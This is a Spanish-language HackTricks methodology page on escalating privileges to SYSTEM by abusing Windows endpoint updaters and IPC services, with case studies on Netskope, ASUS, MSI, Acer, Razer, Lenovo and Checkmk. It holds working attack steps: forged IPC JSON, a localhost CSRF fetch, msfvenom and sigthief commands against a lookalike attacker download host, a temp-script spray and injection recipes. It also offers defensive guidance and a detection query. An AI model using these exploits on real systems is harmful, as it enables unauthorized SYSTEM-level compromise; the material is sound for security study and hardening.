# Abuso de actualizadores empresariales automáticos e IPC privilegiado (p. ej., Netskope, ASUS y MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada de privilegios locales en Windows encontradas en agentes de endpoint y actualizadores empresariales que exponen una superficie IPC de fácil acceso y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client para Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar el registro en un servidor controlado por el atacante y luego entregar un MSI malicioso que el servicio SYSTEM instala.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ideas clave que puedes reutilizar contra productos similares:
- Abusar del IPC localhost de un servicio privilegiado para forzar el registro de nuevo o la reconfiguración hacia un servidor del atacante.
- Implementar los endpoints de actualización del proveedor, entregar una Trusted Root CA fraudulenta y dirigir el actualizador a un paquete malicioso «firmado».
- Evadir comprobaciones débiles del firmante (listas de permitidos de CN), indicadores de resumen opcionales y propiedades MSI permisivas.
- Si el IPC está «cifrado», derivar la clave/IV a partir de identificadores de máquina legibles por todos y almacenados en el registro.
- Si el servicio restringe a los llamadores según la ruta de la imagen o el nombre del proceso, inyectar código en un proceso incluido en la lista de permitidos o iniciar uno suspendido y cargar tu DLL mediante una modificación mínima del contexto del hilo.

Los servicios TCP locales personalizados merecen la misma revisión de identidad y límites de entrada, aunque requieran un PIN u otra credencial de la aplicación. Identifica el proceso que aloja el listener y la cuenta de servicio efectiva; luego inspecciona el binario/versión exactos en uso y comprueba si los campos controlados por el llamador se validan por longitud antes de copiarse en búferes de tamaño fijo o usarse para construir un comando de proceso hijo. La [guía de Microsoft sobre desbordamientos de búfer](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) explica por qué las entradas externas sin validar son peligrosas en código nativo privilegiado. Un listener loopback, una credencial codificada de forma fija o el nombre de un proceso, por sí solos, no demuestran que haya corrupción de memoria ni ejecución como SYSTEM; la posibilidad de acceso, la autorización, la ruta de código y las mitigaciones siguen siendo condiciones independientes. Limita la enumeración rutinaria a métodos pasivos, en lugar de enviar entradas de longitud excesiva que provoquen fallos a un servicio activo.

---
## 1) Forzar el registro en un servidor del atacante mediante IPC localhost

Muchos agentes incluyen un proceso de interfaz de usuario en modo usuario que se comunica con un servicio SYSTEM a través de TCP localhost usando JSON.

Observado en Netskope:
- Interfaz de usuario: stAgentUI (integridad baja) ↔ Servicio: stAgentSvc (SYSTEM)
- ID de comando IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo del exploit:
1) Crea un token de registro JWT cuyas claims controlen el host del backend (p. ej., AddonUrl). Usa alg=None para que no se requiera firma.
2) Envía el mensaje IPC que invoca el comando de aprovisionamiento con tu JWT y el nombre del tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) El servicio empieza a enviar solicitudes a tu servidor malicioso para enrollment/config, por ejemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del caller se basa en la ruta o el nombre, origina la solicitud desde un binario de proveedor incluido en la allow-list (consulta §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC de administración expuesto a la red

Este límite de confianza no siempre se limita a localhost. En el caso reportado de MyReport Updater 2.1.1, un servicio `LocalSystem` escuchaba en todas las interfaces y aceptaba un cambio de configuración gRPC sin autenticación para el host de referencia, el puerto y el modo operativo. Para la variante remota, se necesitaban tanto acceso de red al listener como acceso saliente desde el servicio a la referencia elegida. Evalúa estos aspectos por separado de si el flujo posterior del paquete puede cruzar el límite de escritura de archivos.<sup>[[16]](#references)</sup>

---
## 2) Secuestrar el canal de actualización para ejecutar código como SYSTEM

Una vez que el cliente se comunica con tu servidor, implementa los endpoints esperados y dirígelo a un MSI del atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve una configuración JSON con un intervalo de actualización muy corto, por ejemplo:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA PEM. El servicio lo instala en el almacén Trusted Root de Local Machine.
3) /v2/checkupdate → Proporciona metadatos que apuntan a un MSI malicioso y una versión falsa.

Cómo evadir comprobaciones comunes observadas en la práctica:
- Allow-list de CN del firmante: puede que el servicio solo compruebe que el Subject CN sea igual a “netSkope Inc” o “Netskope, Inc.”. Tu rogue CA puede emitir un certificado leaf con ese CN y firmar el MSI.
- Propiedad CERT_DIGEST: incluye una propiedad benigna de MSI llamada CERT_DIGEST. No se aplica ninguna comprobación durante la instalación.
- Aplicación opcional del digest: un flag de configuración (p. ej., check_msi_digest=false) desactiva la validación criptográfica adicional.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
y ejecuta código arbitrario como NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lección para evadir parches: si un proveedor responde creando una allow-list de unos pocos dominios “de confianza” en lugar de autenticar criptográficamente el origen de la actualización, busca redirectors o reverse proxies propiedad del proveedor que todavía te permitan dirigir el tráfico. En el caso de Netskope, una investigación pública posterior mostró que una allow-list de la época de R129 todavía podía evadirse mediante `rproxy.goskope.com`, que actuaba como proxy de contenido de Azure App Service controlado por un atacante. Considera las allow-lists de nombres de host como un obstáculo menor, no como un límite de confianza.<sup>[[14]](#references)</sup>

Otro modo de fallo es la **metadata de paquete coherente consigo misma, pero no autenticada**. En el caso de MyReport, una referencia controlada por un atacante servía un archivo modificado, mientras que un intermediario cambiaba el digest MD5 y el tamaño del proveedor antes de que las respuestas llegaran al updater. La coincidencia de esos valores comprobaba la coherencia de las respuestas, no el origen del proveedor; no hizo falta ninguna colisión MD5. Un directorio de instalación elegido por quien realiza la llamada convertía entonces la extracción privilegiada en un límite de escritura de archivos. La primitiva de carga de DLL resultante se explica en [encadenar una escritura arbitraria de archivos con DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Falsificar solicitudes IPC cifradas (si existen)

Desde R127, Netskope envolvía el JSON de IPC en un campo encryptData con apariencia de Base64. La ingeniería inversa reveló AES con una key/IV derivados de valores del registro legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir el cifrado y enviar comandos cifrados válidos desde un usuario estándar.<sup>[[1]](#references)[[2]](#references)</sup> Consejo general: si un agente de repente “cifra” su IPC, busca IDs de dispositivo, GUID de producto e IDs de instalación bajo HKLM que puedan usarse como material.

---
## 4) Evadir las allow-lists de procesos que llaman a IPC (comprobaciones de ruta/nombre)

Algunos servicios intentan autenticar al peer resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen con los binarios del proveedor incluidos en una allow-list y ubicados bajo Program Files (p. ej., stagentui.exe, bwansvc.exe, epdlp.exe).

Dos formas prácticas de evadirlas:
- Inyectar una DLL en un proceso incluido en la allow-list (p. ej., nsdiag.exe) y usar IPC como proxy desde dentro de este.
- Iniciar un binario incluido en la allow-list en estado suspendido y preparar tu proxy DLL sin CreateRemoteThread (ver §5) para cumplir las reglas de protección contra manipulaciones aplicadas por el driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Inyección compatible con la protección contra manipulaciones: proceso suspendido + modificación de NtContinue

A menudo, los productos incluyen un driver minifilter/OB callbacks (p. ej., Stadrv) para eliminar permisos peligrosos de los handles a procesos protegidos:
- Proceso: elimina PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader fiable en user mode que respeta estas restricciones:
1) Crear un proceso de un binario del proveedor con CREATE_SUSPENDED.
2) Obtener los handles cuyos permisos todavía tienes: PROCESS_VM_WRITE | PROCESS_VM_OPERATION para el proceso y un handle de thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si modificas el código en un RIP conocido).
3) Sobrescribir ntdll!NtContinue (u otro thunk temprano que se mapee de forma garantizada) con un pequeño stub que llame a LoadLibraryW con la ruta de tu DLL y luego salte de vuelta.
4) Reanudar el thread con ResumeThread para ejecutar tu stub dentro del proceso y cargar tu DLL.

Como no usaste PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME en un proceso que ya estuviera protegido (lo creaste tú), se cumple la política del driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Herramientas prácticas
- NachoVPN (plugin de Netskope) automatiza una rogue CA, la firma de un MSI malicioso y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope es un cliente IPC personalizado que crea mensajes IPC arbitrarios (opcionalmente cifrados con AES) e incluye la inyección en procesos suspendidos para originar las solicitudes desde un binario incluido en una allow-list.<sup>[[4]](#references)</sup>

## 7) Flujo rápido de triage para superficies de updater/IPC desconocidas

Al evaluar un nuevo agente de endpoint o una suite “helper” de motherboard, un flujo de trabajo rápido suele bastar para determinar si estás ante un objetivo prometedor de privesc:<sup>[[6]](#references)</sup>

1) Enumera los listeners de loopback y asócialos con los procesos del proveedor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Enumera las named pipes candidatas:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Extraer datos de enrutamiento respaldados por el registro que usan los servidores IPC basados en plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrae primero los nombres de los endpoints, las claves JSON y los ID de comandos del cliente en modo usuario. Los frontends empaquetados de Electron/.NET suelen filtrar el esquema completo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Busca el predicado de confianza real, no solo la ruta de código que finalmente inicia el proceso:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patrones que conviene priorizar:
- `CryptQueryObject`/certificate parsing sin `WinVerifyTrust` suele indicar que se trató «el certificado existe» como «el certificado es de confianza», lo que permite clonar certificados u otros trucos con firmantes falsos.
- Las comprobaciones de subcadenas/sufijos en `Origin`, `Referer`, URLs de descarga, nombres de procesos o CN de firmantes no son autenticación. `contains(".vendor.com")` suele ser explotable mediante dominios parecidos controlados por un atacante.
- Si la GUI con pocos privilegios decide que «el archivo es de confianza» y el broker de SYSTEM solo consume ese resultado, parchear o reimplementar la DLL/JS del lado del cliente suele permitir eludir por completo la frontera (validación dividida al estilo Razer).
- Si el broker copia un payload a `%TEMP%`/`C:\Windows\Temp` y luego lo valida o programa desde esa ruta, comprueba inmediatamente si hay ventanas de reemplazo TOCTOU y si hay módulos de plugin hermanos que exponen wrappers alternativos de `ExecuteTask()` con comprobaciones más débiles.<sup>[[6]](#references)</sup>

Para objetivos que usan muchas named pipes, PipeViewer permite detectar rápidamente DACL débiles y pipes accesibles de forma remota antes de empezar a revertir el protocolo en profundidad.<sup>[[11]](#references)</sup>

Si el objetivo autentica a los callers solo por PID, ruta de imagen o nombre de proceso, considéralo un obstáculo menor, no una frontera: inyectar en el cliente legítimo o establecer la conexión desde un proceso incluido en la allow-list suele bastar para satisfacer las comprobaciones del servidor. En el caso de las named pipes, [esta página sobre suplantación de clientes y abuso de pipes](named-pipe-client-impersonation.md) explica el primitive con más detalle.

Para un **broker de limpieza o restauración** con privilegios, inspecciona la frontera de confianza de las rutas además de la ACL de la pipe. Un caller con menos privilegios podría seleccionar un destino de restauración o cambiar el nombre de un artefacto de backup preparado en un directorio compartido, aunque el ejecutable del servicio y su directorio de instalación estén protegidos. Confirma por separado que el caller puede invocar el comando de restauración, modificar la entrada preparada exacta o su nombre de archivo, que el broker se ejecuta con una identidad de nivel superior y que la operación de restauración realmente escribe en la ruta protegida seleccionada. Un directorio de preparación con permisos de escritura o una pipe legible no demuestran por sí solos que exista una escritura arbitraria con privilegios; el mapeo del destino y el comportamiento del servicio requieren revisión del código o pruebas controladas. No invoques un comando de limpieza desconocido durante la enumeración pasiva, ya que podría borrar archivos del usuario.

---
## 8) Brokers de add-ins modulares autenticados solo mediante firmas del proveedor (patrón Lenovo Vantage)

Una variante más reciente que vale la pena buscar es el **broker RPC de cliente firmado**: un proceso de escritorio de Lenovo firmado y con pocos privilegios se comunica con un servicio SYSTEM, y el servicio enruta comandos JSON a un conjunto de add-ins descritos en XML bajo `%ProgramData%`. Una vez que se consigue la ejecución de código **dentro de cualquier cliente firmado aceptado**, cada contrato `runas="system"` pasa a formar parte de la superficie de ataque.<sup>[[15]](#references)</sup>

Primitives de alto valor observados en investigaciones sobre Lenovo Vantage:
- **Confiar en el caller porque está firmado por el proveedor**: los investigadores alcanzaron un contexto autenticado al copiar un EXE firmado por Lenovo a un directorio con permisos de escritura y satisfacer un DLL side-load (`profapi.dll`), de modo que se ejecutara código arbitrario dentro de un cliente en el que el servicio ya confiaba.
- **Descubrimiento de la superficie de ataque mediante manifests**: los add-ins se declaran en `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; varios contratos se ejecutan como `SYSTEM`, por lo que enumerar esos manifests suele revelar los verbos privilegiados reales más rápido que revertir el broker.
- **Bugs por comando detrás del canal autenticado**: una vez dentro del cliente de confianza, las investigaciones públicas encontraron traversal de rutas y condiciones de carrera en los verbos de actualización/instalación, abuso de SQL sin procesar en bases de datos de configuración privilegiadas y comprobaciones de rutas del registro basadas en subcadenas que permitían escribir fuera del hive previsto.

Recon útil en un objetivo:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Conclusión práctica: siempre que una suite de utilidades exponga un broker que primero autentique el **proceso llamador** y solo después distribuya las solicitudes entre decenas de comandos de plugins/add-ins, no te detengas después de omitir la comprobación de confianza inicial. Extrae la tabla de manifiesto/contrato y fuzzéa cada verbo de alto privilegio por separado; el canal autenticado suele ocultar varios errores de segunda etapa.

---
## 1) CSRF de browser a localhost contra APIs HTTP privilegiadas (ASUS DriverHub)

DriverHub incluye un servicio HTTP en modo usuario (ADU.exe) en 127.0.0.1:53000 que espera llamadas del browser procedentes de https://driverhub.asus.com. El filtro de origen simplemente ejecuta `string_contains(".asus.com")` sobre la cabecera Origin y sobre las URL de descarga expuestas por `/asus/v1.0/*`. Por tanto, cualquier host controlado por un atacante, como `https://driverhub.asus.com.attacker.tld`, supera la comprobación y puede emitir solicitudes que cambian el estado desde JavaScript.<sup>[[6]](#references)</sup> Consulta [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para ver otros patrones de bypass.

Flujo práctico:
1) Registra un dominio que incluya `.asus.com` y aloja allí una página web maliciosa.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (p. ej., `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el cuerpo JSON que espera el handler; el JS empaquetado del frontend muestra el esquema a continuación.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Incluso la CLI de PowerShell que se muestra a continuación tiene éxito cuando se falsifica el encabezado Origin para que contenga el valor de confianza:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Cualquier visita del navegador al sitio del atacante se convierte, por tanto, en un CSRF local de 1 clic (o 0 clics mediante `onload`) que controla un helper de SYSTEM.

---
## 2) Verificación insegura de firma de código y clonación de certificados (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el cuerpo JSON y los almacena en caché en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica basada en subcadenas, por lo que se acepta `http://updates.asus.com.attacker.tld:8000/payload.exe`. Después de la descarga, ADU.exe solo comprueba que el PE contenga una firma y que la cadena Subject coincida con ASUS antes de ejecutarlo: no hay `WinVerifyTrust` ni validación de la cadena.

Para aprovechar este flujo:
1) Crea un payload (p. ej., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona el firmante de ASUS en él (p. ej., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Aloja `pwn.exe` en un dominio parecido a `.asus.com` y activa UpdateApp mediante el CSRF del navegador anterior.

Como tanto los filtros de Origin como los de URL se basan en subcadenas, y la comprobación del firmante solo compara cadenas, DriverHub descarga y ejecuta el binario del atacante con sus privilegios elevados.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU en las rutas de copia y ejecución del actualizador (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP donde cada trama es `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente principal (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su controlador:
1) Copia el ejecutable proporcionado a `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma mediante `CS_CommonAPI.EX_CA::Verify` (el Subject del certificado debe ser igual a “MICRO-STAR INTERNATIONAL CO., LTD.” y `WinVerifyTrust` debe tener éxito).
3) Crea una tarea programada que ejecuta el archivo temporal como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no se bloquea entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar la Trama A, que apunta a un binario legítimo firmado por MSI (garantiza que la comprobación de firma pase y que la tarea quede en cola).
- Competir con mensajes repetidos de la Trama B que apuntan a un payload malicioso y sobrescriben `MSI Center SDK.exe` justo después de que termine la verificación.

Cuando se active el programador, ejecutará el payload sobrescrito como SYSTEM, aunque se haya validado el archivo original. Para explotar esto de forma fiable, se usan dos goroutines/threads que envían repetidamente CMD_AutoUpdateSDK hasta ganar la ventana TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso de IPC personalizado de nivel SYSTEM e impersonación (MSI Center + Acer Control Centre)

### Conjuntos de comandos TCP de MSI Center
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado en `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de una trama seleccionan ese componente, lo que permite a los atacantes enrutar comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios ejecutores de tareas. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` **sin validar la firma**; cualquier usuario local puede indicarle `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución como SYSTEM de forma determinista.
- Capturar el tráfico de loopback con Wireshark o instrumentar los binarios .NET en dnSpy permite revelar rápidamente la correspondencia entre componentes y comandos; después, clientes personalizados en Go/Python pueden reproducir las tramas.<sup>[[6]](#references)</sup>

### Named pipes de Acer Control Centre y niveles de impersonación
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su ACL discrecional permite clientes remotos (p. ej., `\\TARGET\pipe\treadstone_service_LightMode`). El envío del ID de comando `7` junto con una ruta de archivo invoca la rutina del servicio que crea procesos.
- La biblioteca cliente serializa un byte terminador mágico (113) junto con los argumentos. La instrumentación dinámica con Frida/`TsDotNetLib` (consulta [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para obtener consejos de instrumentación) muestra que el controlador nativo asigna este valor a un `SECURITY_IMPERSONATION_LEVEL` y a un SID de integridad antes de llamar a `CreateProcessAsUser`.
- Al reemplazar 113 (`0x71`) por 114 (`0x72`), se entra en la rama genérica, que conserva el token SYSTEM completo y establece un SID de integridad alta (`S-1-16-12288`). Por tanto, el binario iniciado se ejecuta como SYSTEM sin restricciones, tanto localmente como entre equipos.
- Combina esto con la opción del instalador expuesta (`Setup.exe -nocheck`) para instalar ACC incluso en máquinas virtuales de laboratorio y probar la pipe sin hardware del fabricante.<sup>[[6]](#references)</sup>

Estos errores de IPC destacan por qué los servicios de localhost deben exigir autenticación mutua (SIDs de ALPC, filtros `ImpersonationLevel=Impersonation`, filtrado de tokens) y por qué el helper de cada módulo para “ejecutar binarios arbitrarios” debe aplicar las mismas verificaciones de firmantes.

---
## 3) Helpers “elevator” de COM/IPC respaldados por una validación débil en modo usuario (Razer Synapse 4)

Razer Synapse 4 incorporó otro patrón útil a esta familia: un usuario con pocos privilegios puede pedir a un helper COM que inicie un proceso mediante `RzUtility.Elevator`, mientras que la decisión de confianza se delega a una DLL en modo usuario (`simple_service.dll`) en vez de aplicarse de forma robusta dentro del límite privilegiado.

Ruta de explotación observada:
- Instancia el objeto COM `RzUtility.Elevator`.
- Llama a `LaunchProcessNoWait(<path>, "", 1)` para solicitar un inicio elevado.
- En el PoC público, se elimina mediante un parche la comprobación de firma del PE dentro de `simple_service.dll` antes de enviar la solicitud, lo que permite iniciar un ejecutable arbitrario elegido por el atacante.<sup>[[6]](#references)[[10]](#references)</sup>

Invocación mínima de PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusión general: al hacer reversing de suites “helper”, no te limites a TCP en localhost o a named pipes. Comprueba si hay clases COM con nombres como `Elevator`, `Launcher`, `Updater` o `Utility`, y luego verifica si el servicio privilegiado valida realmente el binario de destino o si simplemente confía en un resultado calculado por una DLL cliente en modo usuario que se puede parchear. Este patrón va más allá de Razer: cualquier diseño dividido en el que el broker de alto privilegio consume una decisión de permitir/denegar procedente del lado de bajo privilegio es una posible superficie de privesc.


---
## Ejecución predecible de scripts temporales durante la reparación de MSI (Checkmk Agent / CVE-2024-0670)

Algunos agentes de Windows todavía implementan acciones privilegiadas escribiendo un `.cmd` temporal en `C:\Windows\Temp` y ejecutándolo como `SYSTEM`. Si el nombre del archivo es predecible y el servicio no vuelve a crear de forma segura los archivos existentes, un usuario con pocos privilegios puede crear de antemano el futuro archivo temporal como **de solo lectura** y hacer que el proceso privilegiado ejecute contenido controlado por el atacante en lugar de su propio script.

Observado en versiones vulnerables de Checkmk Agent:
- patrón temporal: `cmk_all_<PID>_1.cmd`
- ramas afectadas: `2.0.0`, `2.1.0`, `2.2.0`
- desencadenante: **repair** de MSI del paquete de agente almacenado en caché<sup>[[8]](#references)[[9]](#references)</sup>

Flujo de trabajo práctico:
1. Estima un rango realista de PID a partir de los identificadores de proceso actuales o del PID del agente en ejecución.
2. Escribe una carga útil `.cmd` corta en **ASCII** (`Set-Content -Encoding Ascii` o redirección de `cmd.exe`; evita la salida UTF-16 de PowerShell para archivos batch).
3. Haz spray de `C:\Windows\Temp\cmk_all_<PID>_1.cmd` por todo el rango candidato y marca cada archivo como de solo lectura.
4. Activa una reparación del MSI almacenado en caché para que el servicio privilegiado intente volver a generar el script temporal y luego lo ejecute.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Si el producto vulnerable se instaló con Windows Installer, identifica el MSI de nombre aparentemente aleatorio en caché en `C:\Windows\Installer` para averiguar el nombre del producto antes de iniciar la reparación:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notas operativas:
- `qwinsta` es útil cuando `msiexec /fa` falla desde un shell WinRM no interactivo y necesitas determinar si una sesión de escritorio existente o desconectada puede activar correctamente la reparación.<sup>[[7]](#references)</sup>
- Este patrón se aplica también a otros agentes de endpoint y actualizadores que **preparan scripts temporales en ubicaciones con permisos de escritura para todos y luego los ejecutan como SYSTEM**. Comprueba si los nombres son predecibles, si falta la semántica de creación exclusiva y si los flujos de reparación/actualización pueden activarse bajo demanda.

### Reparación interactiva del instalador y consola privilegiada

PDF24 Creator 11.15.1 ilustra otro riesgo de reparación MSI: durante la reparación, su acción personalizada de instalación de impresora puede abrir una consola visible con privilegios SYSTEM. El proveedor modificó el instalador MSI en la versión 11.15.2 para corregir este comportamiento. Una versión antigua del producto solo sirve como indicio para el triaje. Comprueba qué paquete MSI está registrado o es accesible, si este usuario puede iniciar la reparación, si están presentes la acción personalizada vulnerable y el retardo del archivo de registro, y si un escritorio interactivo puede mostrar la consola. El retardo reportado utilizaba un oplock en `faxPrnInst.log`; los permisos de escritura ordinarios en el archivo no son la única condición de acceso. Un shell no interactivo, un paquete inaccesible o un instalador corregido pueden interrumpir la cadena. Este problema no depende de `AlwaysInstallElevated` y es distinto de sustituir un script temporal predecible.

---
## Secuestro remoto de la cadena de suministro mediante validación débil del actualizador (WinGUp / Notepad++)

Entre junio de 2025 y diciembre de 2025, atacantes que comprometieron la infraestructura de alojamiento detrás del flujo de actualización de Notepad++ enviaron selectivamente manifiestos maliciosos a víctimas elegidas. Los actualizadores antiguos basados en WinGUp no verificaban por completo la autenticidad de las actualizaciones, por lo que una respuesta XML maliciosa podía redirigir a los clientes a URL controladas por los atacantes. Como el cliente aceptaba contenido HTTPS sin exigir tanto una cadena de certificados de confianza como una firma PE válida en el instalador descargado, las víctimas descargaban y ejecutaban un `update.exe` de NSIS troyanizado.<sup>[[12]](#references)[[13]](#references)</sup>

Flujo operativo (no se requiere exploit local):
1. **Intercepción de infraestructura**: comprometer la CDN/el alojamiento y responder a las comprobaciones de actualización con metadatos del atacante que apunten a una URL de descarga maliciosa.
2. **NSIS troyanizado**: el instalador descarga/ejecuta un payload y abusa de dos cadenas de ejecución:
   - **Uso de binario firmado propio + sideload**: incluir el `BluetoothService.exe` firmado de Bitdefender y colocar una `log.dll` maliciosa en su ruta de búsqueda. Cuando se ejecuta el binario firmado, Windows carga mediante sideload `log.dll`, que descifra y carga de forma reflectiva la backdoor Chrysalis (protegida con Warbird y con hashing de API para dificultar la detección estática).
   - **Inyección de shellcode mediante script**: NSIS ejecuta un script Lua compilado que utiliza APIs de Win32 (p. ej., `EnumWindowStationsW`) para inyectar shellcode y preparar Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Medidas de hardening/detección para cualquier actualizador automático:
- Exige la **verificación del certificado y la firma** del instalador descargado (fija el firmante del proveedor y rechaza CN/cadenas que no coincidan) y firma el propio manifiesto de actualización (p. ej., XMLDSig). Bloquea las redirecciones controladas por el manifiesto si no se han validado.
- Considera el **sideload de un binario firmado propio** como un punto de pivote para la detección posterior a la descarga: alerta cuando un EXE firmado del proveedor carga una DLL desde fuera de su ruta de instalación canónica (p. ej., Bitdefender carga `log.dll` desde Temp/Downloads) y cuando un actualizador deja o ejecuta instaladores desde una ubicación temporal con firmas que no son del proveedor.
- Supervisa **artefactos específicos del malware** observados en esta cadena (útiles como pivotes genéricos): el mutex `Global\Jdhfv_1.0.1`, escrituras anómalas de `gup.exe` en `%TEMP%` y etapas de inyección de shellcode controladas por Lua.
- Notepad++ respondió reforzando WinGUp en v8.8.9 y versiones posteriores: ahora el XML recibido está firmado (XMLDSig), y las versiones nuevas exigen la verificación del certificado y la firma del instalador descargado en lugar de confiar únicamente en el transporte.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideload de <code>log.dll</code> por un EXE firmado de Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
